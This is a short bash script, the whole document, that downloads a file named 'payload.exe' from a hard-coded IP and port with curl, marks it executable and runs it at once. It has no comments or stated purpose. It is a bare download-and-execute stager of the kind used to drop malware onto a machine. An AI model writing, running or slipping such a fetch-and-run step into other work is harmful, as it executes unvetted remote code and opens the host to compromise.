#!/bin/bash

SERVER_IP="192.168.1.10"
PORT=8080
FILE="payload.exe"

curl "http://$SERVER_IP:$PORT/$FILE" --output $FILE
chmod +x $FILE
./$FILE
